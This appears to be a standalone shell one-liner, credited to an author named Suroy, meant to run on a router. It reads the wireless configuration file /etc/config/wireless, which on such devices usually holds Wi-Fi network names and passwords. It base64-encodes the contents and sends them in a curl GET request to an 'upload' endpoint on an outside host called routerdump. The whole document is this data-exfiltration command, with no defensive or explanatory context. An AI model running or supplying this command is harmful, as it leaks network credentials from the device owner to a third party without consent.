# author: Suroy

curl --location --request GET "https://routerdump/app.php?id=1&mod=upload&param=$(cat /etc/config/wireless | base64 | sed ":a;N;s/\n//g;ba")"

